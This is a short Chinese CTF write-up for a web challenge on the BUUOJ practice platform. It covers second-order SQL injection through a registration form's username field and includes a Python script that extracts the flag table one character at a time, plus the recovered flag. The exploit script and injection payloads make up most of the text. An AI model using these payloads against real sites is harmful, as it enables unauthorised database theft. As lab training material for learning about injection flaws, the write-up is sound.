![](<./img/Pasted image 20230123100544.png>)

```
/login.php
```

![](<./img/Pasted image 20230123100602.png>)

```
/register.php
```

![](<./img/Pasted image 20230123101004.png>)

```
/index.php
```

![](<./img/Pasted image 20230123101414.png>)

![](<./img/Pasted image 20230123105630.png>)

只有用户名存在回显

猜测注册时执行类似下面的查询

```sql
INSERT INTO users (username, password, email)
VALUES ('$username', '$password', '$email')
```

注册时，如果用户名包含`,`则会回显`nnnnoooo!!!`

尝试对用户名进行注入

```
username='+7*8+'
```

![](<./img/Pasted image 20230123111509.png>)

验证了上面的猜测

```python
import requests
import time
import os
from bs4 import BeautifulSoup

url = 'http://xxx.node4.buuoj.cn:81/{}'
session = requests.sessions.Session()


def register(username, password, email):
    data = {'username': username, 'password': password, 'email': email}
    requests.post(url.format('register.php'), data=data)

def login(email, password):
    data = {'email': email, 'password': password}
    session.post(url.format('login.php'), data=data)

def get_username():
    return BeautifulSoup(session.get(url.format('index.php')).text, 'lxml').select_one('.user-name').getText()

def hack(username, password, email):
    register(username, password, email)
    login(email, password)
    print(chr(int(get_username())), end='')
    os.sys.stdout.flush()

for index in range(100):
    hack("'+ascii(substr((select * from flag) from {} for 1))+'".format(index), '123', '{}@123.45'.format(index))
    time.sleep(0.5)
```

```
flag{621b1f14-9443-4f74-af48-f6783c178030}
```

#Web #SQL注入